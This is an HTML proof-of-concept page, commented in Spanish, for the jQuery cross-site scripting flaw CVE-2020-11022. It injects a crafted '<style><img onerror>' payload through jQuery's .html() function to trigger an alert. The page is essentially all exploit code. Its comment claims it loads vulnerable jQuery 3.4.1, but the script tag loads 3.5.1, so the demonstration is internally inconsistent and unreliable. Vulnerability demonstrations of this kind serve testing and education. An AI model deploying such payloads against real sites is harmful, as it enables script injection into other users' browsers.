<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>PoC CVE-2020-11022</title>
    <!-- Cargamos una versión VULNERABLE de jQuery (3.4.1) -->
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
</head>
<body>

    <h1>Prueba de Vulnerabilidad jQuery</h1>
    <div id="zona-peligrosa"></div>

    <script>
        // EL PAYLOAD MALICIOSO
        // A simple vista parece un tag style cerrado y una imagen.
        // Pero la magia ocurre cuando jQuery intenta "arreglar" el <style />
        var payload = "<style><style /><img src=x onerror=alert('HACKEADO_POR_CVE-2020-11022')>";

        console.log("Intentando inyectar payload...");

        // La función vulnerable .html() procesa el string
        $("#zona-peligrosa").html(payload);
    </script>

</body>
</html>
